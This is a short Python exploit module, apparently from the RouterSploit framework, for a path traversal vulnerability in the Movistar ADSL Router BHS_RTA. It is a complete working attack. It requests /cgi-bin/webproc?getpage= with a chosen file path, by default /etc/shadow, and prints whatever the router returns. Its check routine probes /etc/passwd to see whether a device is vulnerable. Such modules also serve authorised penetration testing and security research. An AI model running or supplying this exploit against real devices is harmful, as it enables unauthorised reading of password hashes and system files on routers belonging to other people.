# rsf exploit module
# description: Exploits Movistar ADSL Router BHS_RTA Path Traversal vulnerability, allowing the reading of any file on the system.

import requests

class Exploit:
    __info__ = {
        "name": "Movistar ADSL Router BHS_RTA Path Traversal",
        "description": "Module exploits Movistar ADSL Router BHS_RTA Path Traversal vulnerability "
                       "which allows to read any file on the system.",
        "authors": (
            "Todor Donev <todor.donev[at]gmail.com>",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://www.exploit-db.com/exploits/40734/",
        ),
        "devices": (
            "Movistar ADSL Router BHS_RTA",
        ),
    }

    def __init__(self, target, port=80, filename="/etc/shadow"):
        self.target = target
        self.port = port
        self.filename = filename

    def run(self):
        if self.check():
            path = f"/cgi-bin/webproc?getpage={self.filename}&var:language=es_es&var:page="
            response = requests.get(f"http://{self.target}:{self.port}{path}")
            
            if response.status_code == 200 and len(response.text):
                print(f"Success! File: {self.filename}")
                print(response.text)
            else:
                print("Exploit failed")
        else:
            print("Device seems to be not vulnerable")

    def check(self):
        response = requests.get(f"http://{self.target}:{self.port}/cgi-bin/webproc?getpage=/etc/passwd&var:language=es_es&var:page=")
        
        if response.status_code == 200 and "/etc/passwd" in response.text:
            return True
        return False

